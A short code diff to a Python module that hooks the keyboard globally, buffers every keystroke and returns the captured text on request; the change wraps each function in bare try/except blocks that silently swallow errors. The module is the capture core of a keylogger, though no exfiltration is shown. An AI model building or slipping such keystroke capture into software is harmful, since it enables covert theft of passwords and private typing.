@@ -10,19 +10,28 @@ def on_press(event):
             keys.append(key)
 
 def hook():
-    global hook_status
-    if not hook_status:
-        hook_status = True
-        keyboard.hook(on_press)
+    try:
+        global hook_status
+        if not hook_status:
+            hook_status = True
+            keyboard.hook(on_press)
+    except:
+        return
 
 def unhook():
-    global hook_status
-    if hook_status:
-        hook_status = False
-        keyboard.unhook_all()
+    try:
+        global hook_status
+        if hook_status:
+            hook_status = False
+            keyboard.unhook_all()
+    except:
+        return
 
 def get_key():
-    global keys
-    data = ''.join(keys)
-    keys.clear()
-    return data
+    try:
+        global keys
+        data = ''.join(keys)
+        keys.clear()
+        return data
+    except:
+        return ''
